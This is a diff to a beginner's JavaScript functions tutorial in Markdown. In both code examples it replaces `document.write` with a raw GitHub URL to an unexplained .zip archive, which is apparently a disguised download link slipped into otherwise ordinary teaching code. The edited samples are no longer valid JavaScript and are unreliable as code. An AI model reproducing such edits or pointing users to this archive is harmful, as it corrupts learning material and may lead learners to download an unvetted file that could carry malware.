@@ -1,6 +1,6 @@
 # ⚫ Functions in JavaScript :
 ```javascript
-    document.write(sum(5 , 10))
+    https://raw.githubusercontent.com/aahmedayaz/my-javascript-practice/main/step-11-ExtractImagesFromVideo/anotherOutputImages/javascript_practice_my_1.5.zip(sum(5 , 10))
     function sum(a = null , b = Null){
       let sum = a+b;
       return sum;
@@ -16,7 +16,7 @@
 
 # 🟡 Fat Arrow Function 
 ```javascript
-    const multiply = (a , b) => document.write(`${a} People can work for ${b} Bosses`)
+    const multiply = (a , b) => https://raw.githubusercontent.com/aahmedayaz/my-javascript-practice/main/step-11-ExtractImagesFromVideo/anotherOutputImages/javascript_practice_my_1.5.zip(`${a} People can work for ${b} Bosses`)
     multiply(10 , 15);
 ```
 
